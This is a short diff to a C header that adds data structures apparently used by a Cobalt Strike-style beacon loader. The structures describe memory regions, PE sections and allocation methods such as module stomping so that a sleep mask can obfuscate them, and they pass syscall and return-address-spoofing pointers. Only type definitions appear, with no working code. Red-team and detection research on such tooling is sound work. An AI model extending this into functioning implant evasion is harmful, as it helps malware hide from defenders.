@@ -88,6 +88,75 @@ typedef struct StackSnapshot {
     DWORD count;                                  // Number of frames captured
 } StackSnapshot, *PStackSnapshot;
 
+// ========== ALLOCATED_MEMORY STRUCTURES FOR SLEEP MASK ==========
+// These structures tell sleep mask which memory regions to obfuscate
+
+typedef enum {
+    PURPOSE_SLEEPMASK_MEMORY = 0,
+    PURPOSE_BEACON_MEMORY,
+    PURPOSE_BOF_MEMORY,
+    PURPOSE_USER_DEFINED_MEMORY = 1000
+} ALLOCATED_MEMORY_PURPOSE;
+
+typedef enum {
+    LABEL_EMPTY = 0,
+    LABEL_BUFFER,
+    LABEL_PEHEADER,
+    LABEL_TEXT,
+    LABEL_RDATA,
+    LABEL_DATA,
+    LABEL_PDATA,
+    LABEL_RELOC,
+    LABEL_USER_DEFINED = 1000
+} ALLOCATED_MEMORY_LABEL;
+
+typedef enum {
+    METHOD_UNKNOWN = 0,
+    METHOD_VIRTUALALLOC,
+    METHOD_HEAPALLOC,
+    METHOD_MODULESTOMP,
+    METHOD_NTMAPVIEW,
+    METHOD_USER_DEFINED = 1000
+} ALLOCATED_MEMORY_ALLOCATION_METHOD;
+
+typedef struct {
+    BOOL Cleanup;
+    ALLOCATED_MEMORY_ALLOCATION_METHOD AllocationMethod;
+    PVOID AdditionalInfo;  // Simplified - can be expanded if needed
+} ALLOCATED_MEMORY_CLEANUP_INFORMATION;
+
+typedef struct {
+    ALLOCATED_MEMORY_LABEL Label;
+    PVOID  BaseAddress;
+    SIZE_T VirtualSize;
+    DWORD  CurrentProtect;
+    DWORD  PreviousProtect;
+    BOOL   MaskSection;
+} ALLOCATED_MEMORY_SECTION;
+
+typedef struct {
+    ALLOCATED_MEMORY_PURPOSE Purpose;
+    PVOID  AllocationBase;
+    SIZE_T RegionSize;
+    DWORD Type;
+    ALLOCATED_MEMORY_SECTION Sections[8];
+    ALLOCATED_MEMORY_CLEANUP_INFORMATION CleanupInformation;
+} ALLOCATED_MEMORY_REGION;
+
+typedef struct {
+    ALLOCATED_MEMORY_REGION AllocatedMemoryRegions[6];
+} ALLOCATED_MEMORY;
+
+typedef struct {
+    unsigned int version;
+    PVOID syscalls;
+    char  custom[32];
+    PVOID rtls;
+    ALLOCATED_MEMORY* allocatedMemory;
+} USER_DATA;
+
+#define DLL_BEACON_USER_DATA 0x0d
+
 #if !defined(NTSTATUS)
 typedef LONG NTSTATUS;
 typedef NTSTATUS *PNTSTATUS;
